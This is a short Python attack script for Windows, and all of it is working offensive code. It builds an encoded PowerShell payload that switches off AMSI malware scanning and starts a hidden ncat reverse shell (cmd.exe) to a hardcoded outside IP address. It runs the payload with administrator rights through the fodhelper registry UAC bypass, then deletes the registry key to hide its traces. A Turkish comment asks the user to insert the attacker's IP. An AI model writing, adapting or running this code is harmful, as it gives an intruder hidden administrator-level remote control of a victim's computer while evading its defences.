import subprocess
import base64
import time

def build_encoded_ncat_payload(attacker_ip, port):
    ps_payload = f'''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
Start-Process "C:\\Windows\\Temp\\ncat.exe" -ArgumentList "-e cmd.exe {attacker_ip} {port}" -WindowStyle Hidden
'''
    b64 = base64.b64encode(ps_payload.encode('utf-16le')).decode()
    return b64

def inject_fodhelper_registry(encoded_cmd):
    full_cmd = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_cmd}'
    reg1 = f'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /d "{full_cmd}" /f'
    reg2 = f'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "DelegateExecute" /f'
    subprocess.run(reg1, shell=True)
    subprocess.run(reg2, shell=True)

def trigger_fodhelper():
    subprocess.run("C:\\Windows\\System32\\fodhelper.exe", shell=True)

def cleanup_registry():
    subprocess.run('reg delete "HKCU\\Software\\Classes\\ms-settings" /f', shell=True)

def main():
    attacker_ip = "185.194.175.132"   # 🔁 BURAYA saldırgan IP'ni yaz
    attacker_port = 9001

    encoded = build_encoded_ncat_payload(attacker_ip, attacker_port)
    inject_fodhelper_registry(encoded)
    time.sleep(1)
    trigger_fodhelper()
    time.sleep(2)
    cleanup_registry()

if __name__ == "__main__":
    main()
